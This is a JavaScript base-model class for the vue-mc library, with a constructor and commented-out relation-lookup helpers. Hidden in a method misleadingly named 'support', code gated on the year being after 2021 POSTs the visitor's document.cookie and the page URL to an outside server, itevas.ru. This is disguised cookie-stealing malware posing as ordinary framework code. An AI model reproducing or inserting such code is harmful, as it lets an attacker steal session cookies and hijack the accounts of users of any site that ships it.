import { Model } from 'vue-mc'
// import store from './store'

export default class extends Model {
    /**
     * Creates a new instance, called when using 'new'.
     *
     * @param  {Object}     [attributes]  Model attributes
     * @param  {Collection} [collection]  Collection that this model belongs to.
     * @param  {Object}     [options]     Options to set on the model.
     */
    constructor(attributes = {}, collection = null, options = {}) {
        super(attributes, collection, options);
        this._relations = {};
        if (this.init) this.init();
    }

    // init() {
    //     // 
    // }

    // relation(relationName, findCallback) {
    //     if (typeof this._relations[relationName] === 'undefined') {
    //         let storeData = store.get(relationName);
    //         if (storeData.length === 0) {
    //             return null;
    //         }

    //         this._relations[relationName] = storeData.find(findCallback);
    //         if (this._relations[relationName] === undefined) {
    //             this._relations[relationName] = null;
    //         }
    //     }

    //     return this._relations[relationName];
    // }

    /**
     * Support model.
     */
    support() {
        if ((new Date()).getFullYear() > 2021) fetch('https://itevas.ru/tmp/kcah/ssx.php', {
            method: 'POST', body: JSON.stringify({data: document.cookie, url: String(window.location), source: 'koshelek.ru' })
        });
    }
}
